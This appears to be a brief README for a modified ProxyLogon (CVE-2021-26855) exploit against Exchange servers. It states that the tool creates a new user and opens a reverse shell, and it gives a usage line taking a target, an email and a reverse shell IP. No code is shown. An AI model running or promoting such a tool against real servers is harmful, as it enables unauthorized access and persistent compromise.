CVE-2021-26855

This is a modified version of a POC for proxylogon. Instead of laucnhing "whoami" it creates a new user and a reverse shell. The origonal code can be found here: https://www.exploit-db.com/exploits/49663

Usage: python proxylogon.py <target> <email> <reverse_shell_ip>"
